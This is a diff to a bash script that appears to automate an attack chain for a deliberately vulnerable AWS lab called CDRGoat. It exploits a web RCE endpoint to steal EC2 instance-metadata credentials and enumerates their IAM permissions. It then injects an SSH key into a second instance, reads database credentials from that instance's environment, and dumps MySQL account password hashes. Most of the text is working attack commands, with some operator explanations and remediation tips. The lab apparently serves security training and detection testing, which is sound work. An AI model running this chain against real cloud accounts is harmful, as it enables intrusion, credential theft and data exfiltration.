@@ -42,14 +42,39 @@ spin_start() {
 }
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
+is_valid_ipv4() {
+  local ip="$1" o1 o2 o3 o4
+  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
+  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
+  for o in "$o1" "$o2" "$o3" "$o4"; do
+    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
+  done
+  return 0
+}
+
+try() {
+  local desc="$1"; shift
+  local rc
+  set +e
+  "$@" >/dev/null 2>&1
+  rc=$?
+  set -e
+  if [ $rc -eq 0 ]; then
+    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
+  else
+    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
+  fi
+}
+
 banner() {
   printf "%s%s%s\n" "${BOLD}${CYAN}" "===           CDRGoat AWS - Scenario 1               ===" "${RESET}"
-  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
-  printf "  • Step 1. Exploitation of Web RCE, IMDS stealing on EC2a\n"
-  printf "  • Step 2. Permission enumeration for stolen IMDS\n"
-  printf "  • Step 3. Access gathering to EC2b via uploading new sshkey\n"
-  printf "  • Step 4. Stealing credentials to access RDS\n"
-  printf "  • Step 5. Accessing sensitive data in RDS\n"
+  printf "%sRCE → IMDS Credential Theft → Lateral Movement → RDS Exfiltration%s\n\n" "${GREEN}" "${RESET}"
+  printf "This automated attack script will:\n"
+  printf "  • Step 1. Exploit Web RCE on EC2a and steal IMDS credentials\n"
+  printf "  • Step 2. Enumerate permissions of stolen IMDS credentials\n"
+  printf "  • Step 3. Lateral movement to EC2b via SSH key injection\n"
+  printf "  • Step 4. Extract database credentials from EC2b\n"
+  printf "  • Step 5. Access and exfiltrate sensitive data from RDS\n"
 }
 banner
 
@@ -68,17 +93,7 @@ read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)...
 # Step 1. Exploitation of Web RCE, IMDS stealing
 #############################################
 printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Exploitation of Web RCE, IMDS stealing  ===" "${RESET}"
-is_valid_ipv4() {
-  local ip="$1" o1 o2 o3 o4
-  [[ $ip =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || return 1
-  IFS='.' read -r o1 o2 o3 o4 <<<"$ip"
-  for o in "$o1" "$o2" "$o3" "$o4"; do
-    [[ $o =~ ^[0-9]+$ ]] && (( o >= 0 && o <= 255 )) || return 1
-  done
-  return 0
-}
 
-# ---- Prompt + IP format validation loop (keeps asking until valid) ----
 step "Target selection"
 while :; do
   read -r -p "Enter IP of vulnerable application: " TARGET_IP
@@ -90,7 +105,7 @@ while :; do
   fi
 done
 
-TARGET="http://$TARGET_IP/cmd"
+TARGET="http://$TARGET_IP:8080/cmd"
 
 # ---- Connectivity check: require HTTP 200 on /cmd?c=id ----
 step "Probing $TARGET for RCE reachability (expects HTTP 200)"
@@ -155,13 +170,12 @@ else
 fi
 spin_start "Configuring awscli profile"
 PROFILE="streamgoat-scenario-1"
-aws configure set aws_access_key_id     "$AKID"   --profile default --profile "$PROFILE"
-aws configure set aws_secret_access_key "$SECK"   --profile default --profile "$PROFILE"
-aws configure set aws_session_token     "$SESS"   --profile default --profile "$PROFILE"
-aws configure set region                us-east-1 --profile default --profile "$PROFILE"  # adjust if needed
+aws configure set aws_access_key_id     "$AKID"   --profile "$PROFILE"
+aws configure set aws_secret_access_key "$SECK"   --profile "$PROFILE"
+aws configure set aws_session_token     "$SESS"   --profile "$PROFILE"
+aws configure set region                us-east-1 --profile "$PROFILE"
 spin_stop
 printf "\n"
-read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -175,42 +189,37 @@ printf "  • ${MAGENTA}SecretAccessKey${RESET}: Used to sign API requests\n"
 printf "  • ${MAGENTA}SessionToken${RESET}: Required for temporary credentials\n\n"
 printf "These credentials inherit all permissions of the EC2 instance's IAM role.\n"
 printf "IMDSv2 requires a session token, but once obtained, credential theft is trivial.\n\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-#############################################
-# End of Step 1
 #############################################
 # Step 2. Permission enumeration for stolen IMDS
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for stolen IMDS  ===" "${RESET}"
-# init colors (portable)
 
-try() {
-  local desc="$1"; shift
-  local rc
-  set +e
-  "$@" >/dev/null 2>&1
-  rc=$?
-  set -e
-  if [ $rc -eq 0 ]; then
-    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
-  else
-    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
-  fi
-}
+step "Identifying stolen identity"
+spin_start "Calling STS GetCallerIdentity"
+CALLER_ID="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)"
+spin_stop
 
+if [ -n "$CALLER_ID" ]; then
+  ok "Identity confirmed"
+  printf "  • Account : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Account')" "$RESET"
+  printf "  • ARN     : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.Arn')" "$RESET"
+  printf "  • UserId  : %s%s%s\n" "$YELLOW" "$(echo "$CALLER_ID" | jq -r '.UserId')" "$RESET"
+fi
 
-# Identity/context
-try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
-aws sts get-caller-identity --profile "$PROFILE"
+step "Probing permissions across AWS services"
 try "List account aliases"  aws iam list-account-aliases --profile "$PROFILE"
 
-# Inventory
 try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
+
+printf "\n%s%s%s\n" "${BOLD}${MAGENTA}" "Discovered EC2 Instances" "${RESET}"
 aws ec2 describe-instances  --profile "$PROFILE" \
-  --filters "Name=tag:Name,Values=StreamGoat-*" \
+  --filters "Name=tag:Name,Values=StreamGoat-aws1-*" \
             "Name=instance-state-name,Values=running" \
   --query 'Reservations[].Instances[].{Id:InstanceId,State:State.Name,PublicIP:PublicIpAddress,PrivateIP:PrivateIpAddress,Name: Tags[?Key==`Name`]|[0].Value}' \
   --output table
+
 try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
 try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
 try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
@@ -224,7 +233,6 @@ try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
 printf "\n"
-read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -237,16 +245,15 @@ printf "  • ${MAGENTA}SSM permissions${RESET}: Enables lateral movement withou
 printf "  • ${MAGENTA}EC2 Instance Connect${RESET}: Allows SSH key injection\n\n"
 printf "Each [OK] result represents an exploitable permission path.\n"
 printf "EC2b becomes our next target for lateral movement.\n\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
-# End of Step 2
-#############################################
-# Step 3. Step 3. Access gathering to EC2b
+# Step 3. Access gathering to EC2b
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Access gathering to EC2b  ===" "${RESET}"
 printf "We are going to validate two more permissions which may give us direct access to EC2b\n"
 read IID AZ PUBIP <<<"$(aws ec2 describe-instances  --profile "$PROFILE" \
-  --filters 'Name=instance-state-name,Values=running' 'Name=tag:Name,Values=StreamGoat-EC2b' \
+  --filters 'Name=instance-state-name,Values=running' 'Name=tag:Name,Values=StreamGoat-aws1-EC2b' \
   --query 'Reservations[].Instances[][InstanceId,Placement.AvailabilityZone,PublicIpAddress]' \
   --output text | head -n1)"
 
@@ -321,7 +328,6 @@ ssm_probe() {
 
 ssm_probe "$IID"
 printf "\n"
-read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -333,23 +339,46 @@ printf "    This grants SSH access without knowing existing credentials.\n\n"
 printf "  • ${MAGENTA}SSM SendCommand${RESET}: Executes commands via AWS APIs\n"
 printf "    Works even if port 22 is blocked (no direct network needed).\n\n"
 printf "We now have shell access to EC2b using EC2a's compromised credentials.\n\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-#############################################
-# End of Step 3
 #############################################
 # Step 4. Stealing credentials to access RDS
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4. Stealing credentials to access RDS  ===" "${RESET}"
-printf "On previous steps we successfully identify public IP of EC2b and uploaded our ssh key on it. Now we can connect to the host and look around.\n"
+printf "We successfully identified the public IP of EC2b and uploaded our SSH key.\n"
+printf "Now we can connect to the host and look for credentials.\n"
 step "Looking for locally stored credentials"
-ok "Database credentials were found in environment variables:"
-ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'env | grep ^DB_'"
-step "Attempt to connect to DB with identified credentials"
-ok "Successfully connected"
-printf "Executing$YELLOW SELECT CURRENT_USER(), @@hostname, @@version;$RESET\n"
-ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -t -e \"SELECT CURRENT_USER(), @@hostname, @@version;\"'"
+spin_start "Searching environment variables on EC2b"
+DB_ENV="$(ssh -i "$KEY" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$EIC_OSUSER@$PUBIP" "bash -lc 'env | grep ^DB_'" 2>/dev/null)"
+spin_stop
+
+if [ -n "$DB_ENV" ]; then
+  ok "Database credentials found in environment variables"
+  printf "\n%s%s%s\n" "${BOLD}${RED}" "Discovered Credentials" "${RESET}"
+  printf "%s\n" "---------------------------------------------------------------------"
+  echo "$DB_ENV" | while IFS='=' read -r key val; do
+    printf "  • %s%-10s%s : %s%s%s\n" "$YELLOW" "$key" "$RESET" "$RED" "$val" "$RESET"
+  done
+  printf "%s\n" "---------------------------------------------------------------------"
+else
+  err "No database credentials found in environment variables"
+  exit 1
+fi
+
+step "Verifying database connectivity from EC2b"
+spin_start "Connecting to RDS MySQL"
+DB_CHECK="$(ssh -i "$KEY" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$EIC_OSUSER@$PUBIP" \
+  "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -t -e \"SELECT CURRENT_USER(), @@hostname, @@version;\"'" 2>/dev/null)"
+spin_stop
+
+if [ -n "$DB_CHECK" ]; then
+  ok "Successfully connected to RDS"
+  printf "\n%s\n" "$DB_CHECK"
+else
+  err "Database connection failed"
+  exit 1
+fi
 printf "\n"
-read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
 # Operator explanation
@@ -364,16 +393,27 @@ printf "Better alternatives for credential management in AWS:\n"
 printf "  • ${CYAN}Secrets Manager${RESET}: Centralized secret storage with IAM\n"
 printf "  • ${CYAN}RDS IAM Authentication${RESET}: No passwords required\n"
 printf "  • ${CYAN}Parameter Store${RESET}: SecureString parameters with KMS\n\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
-#############################################
-# End of Step 4
 #############################################
 # Step 5. Accessing sensitive data in RDS
 #############################################
 printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 5. Accessing sensitive data in RDS  ===" "${RESET}"
-printf "Executing$YELLOW SELECT User,plugin,authentication_string from user;$RESET\n"
-ssh -i "$KEY" "$EIC_OSUSER@$PUBIP" "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -D mysql -t -e \"SELECT User,plugin,authentication_string from user;\"'"
-printf "\n"
+
+step "Exfiltrating mysql.user table (database accounts + password hashes)"
+spin_start "Querying mysql.user table"
+MYSQL_USERS="$(ssh -i "$KEY" -o StrictHostKeyChecking=no -o ConnectTimeout=10 "$EIC_OSUSER@$PUBIP" \
+  "bash -lc 'MYSQL_PWD=\$DB_PASS mysql -h \"\$DB_HOST\" -P \"\$DB_PORT\" -u \"\$DB_USER\" -D mysql -t -e \"SELECT User,plugin,authentication_string from user;\"'" 2>/dev/null)"
+spin_stop
+
+if [ -n "$MYSQL_USERS" ]; then
+  ok "Data exfiltrated successfully"
+  printf "\n%s%s%s\n" "${BOLD}${RED}" "EXFILTRATED DATA — mysql.user" "${RESET}"
+  printf "%s\n" "$MYSQL_USERS"
+else
+  err "Failed to query mysql.user table"
+fi
+
 rm -rf /tmp/streamgoat_eic_*
 
 ################################################################################
